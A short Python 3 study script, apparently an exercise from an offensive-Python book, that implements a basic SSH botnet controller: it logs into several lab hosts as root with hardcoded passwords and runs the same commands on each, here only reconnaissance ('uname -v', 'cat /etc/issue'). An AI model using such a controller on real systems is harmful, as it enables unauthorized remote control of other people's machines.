# A Botnet command and control script, based on chapter 2.
# Python 3.4

"""

    Nothing new from what we already saw until now. The class declaration is straightforward, with OO format.
    The main difference was the way that outputs are handled by Python 3. With Python 2, one could work direct with
    outputs, since they are literal strings. However with Python 3+, the output is binary code, so for the output be
    printed formatted, we need to convert from binary to string. I've chose the UTF-8 as codification since it is
    commonly used.

    Source:
        - http://python3porting.com/problems.html#bytes-strings-and-unicode
        - http://stackoverflow.com/questions/606191/convert-bytes-to-a-python-string

    # TODO

        Make it accept parameters for include new hosts. I'll need a form of database. Maybe SQLite or even in txt file.

    PS: The response time isn't good.
    I hadn't checked if the reason is because my ssh configuration isn't properly set or some of the methods used
    here aren't respond as expected.

"""


from pexpect import pxssh


# The client class defines the behavior of communications with multiple hosts.
# Basically, two options are defined: connection and command parser.
class Client:

    def __init__(self, host, user, password):

        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):

        try:
            connection = pxssh.pxssh()
            connection.login(self.host, self.user, self.password)
            return connection

        except Exception as error:
            print(error)
            print("[-] Error while connecting")

    def send_command(self, cmd):

        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


# Execute any command sent.
def botnetCommand(command):

    for client in botNet:

        output = client.send_command(command)
        print("[*] Output from {0}".format(client.host))

        # Here is where it changes from binary to UTF-8 as stated before.
        print("[+] {0} \n".format(output.decode("utf-8")))


# Add clients to a list so it can be iterated later.
def addClient(host, user, password):

    client = Client(host, user, password)
    botNet.append(client)

botNet = []

# Defines the hosts parameters
addClient('192.168.25.87', 'root', '12345')
addClient('192.168.25.200', 'root', '12345')

# Defines the commands sent by the script to the target hosts
botnetCommand("uname -v")
botnetCommand("cat /etc/issue")